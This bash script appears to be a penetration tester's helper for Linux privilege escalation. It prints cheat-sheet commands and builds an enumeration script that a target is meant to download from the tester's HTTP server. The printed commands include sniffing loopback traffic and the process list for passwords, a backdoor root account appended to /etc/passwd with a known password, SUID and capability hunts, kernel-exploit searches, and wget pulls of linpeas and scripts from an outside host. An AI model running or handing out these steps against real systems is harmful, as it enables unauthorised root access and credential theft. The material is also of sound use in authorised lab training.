#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
linux_esclation_strategy() {
    echo 'Linux Manual Enumeration'
    echo "wget http://$http_ip:$http_port/linux_auto.sh"
    echo 'Linux Automatic Enumeration'
    echo 'unix_privesc_check standard'
    echo 'linpeas.sh'
    echo 'Look at the processes ruunning'
    echo 'watch -n 1 "ps -aux | grep pass"'
    echo 'sudo tcpdump -i lo -A | grep "pass"'
    echo "Look at cron jobs"
    grep "CRON" /var/log/syslog
    echo 'Adding password to /etc/passwd'
    echo 'openssl passwd w00t'
    echo 'echo "root2:$(openssl passwd w00t):0:0:root2:/root:/bin/bash" >> /etc/passwd'
    echo 'SUID'
    echo 'find / -perm -u=s -type f 2>/dev/null'
    echo 'Linux Capabilities'
    echo '/usr/sbin/getcap -r / 2>/dev/null'
    echo 'check GTFOBins for Linux'
    echo 'https://gtfobins.github.io/'
    echo 'check logs for unexpected blocks'
    echo 'cat /var/log/syslog | grep "[exploited process]"'
    echo 'Try other commands if they seem to be blocked'
    echo 'Search for kernel exploits'
    echo 'uname -r'
    echo 'arch'
    echo 'searchsploit linux kernel $(uname -r)'
}

linux_enumeration_auto() {
    echo 'Linux Manual Enumeration'
    echo "wget http://$http_ip:$http_port/linux_auto.sh"
    echo '#!/bin/bash' > linux_auto.sh
    echo 'id' >> linux_auto.sh
    echo 'cat /etc/passwd' >> linux_auto.sh
    echo 'hostname' >> linux_auto.sh
    echo 'cat /etc/issue' >> linux_auto.sh
    echo 'uname -a' >> linux_auto.sh
    echo 'ps aux' >> linux_auto.sh
    echo 'ip a' >> linux_auto.sh
    echo 'routel' >> linux_auto.sh
    echo 'ss -anp' >> linux_auto.sh
    echo 'cat /etc/iptables/rules.v4' >> linux_auto.sh
    echo 'ls -lah /etc/cron*' >> linux_auto.sh
    echo 'crontab -l' >> linux_auto.sh
    echo 'sudo crontab -l' >>  linux_auto.sh
    echo 'dpkg -l' >> linux_auto.sh
    echo 'find / -writable -type d 2>/dev/null' >> linux_auto.sh
    echo 'cat /etc/fstab' >> linux_auto.sh
    echo 'mount' >> linux_auto.sh
    echo 'lsblk' >> linux_auto.sh
    echo 'lsmod' >> linux_auto.sh
    echo '/sbin/modinfo libata' >> linux_auto.sh
    echo 'find / -perm -u=s -type f 2>/dev/null' >> linux_auto.sh
    echo 'Linux Automatic Enumeration' >> linux_auto.sh
    echo 'echo "Look at user trails"' >> linux_auto.sh
    echo 'env' >> linux_auto.sh
    echo 'cat ~/.bashrc' >> linux_auto.sh
    echo 'Linux Automatic Enumeration'
    echo "wget http://$http_ip:$http_port/unix_privesc_check.sh" > linux_auto.sh
    echo unix_privesc_check standard >> linux_auto.sh
}

generate_download_linux() {
    local file="$1"
    if [ -z "$file" ]; then
        echo "File name is required."
        return 1
    fi
    file=$(echo "$file" | sed 's/ /%20/g') 
    local output_option=""
    if [ ! -z "$2" ]; then
        output_option="-O \"$2\""
    fi
    if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
        echo "HTTP IP or port is not set."
        return 1
    fi
    echo "wget http://$http_ip:$http_port/$file $output_option"
}

download_linpeas() {
    if [ ! -f "linpeas.sh" ]; then
        linpeas_link=$(curl -s https://github.com/peass-ng/PEASS-ng/releases | grep linpeas.sh | grep -oP 'href="\K[^"]+')
        wget https://github.com$linpeas_link
    fi
    echo "wget http://$http_ip:$http_port/linpeas.sh -O linpeas.sh"
}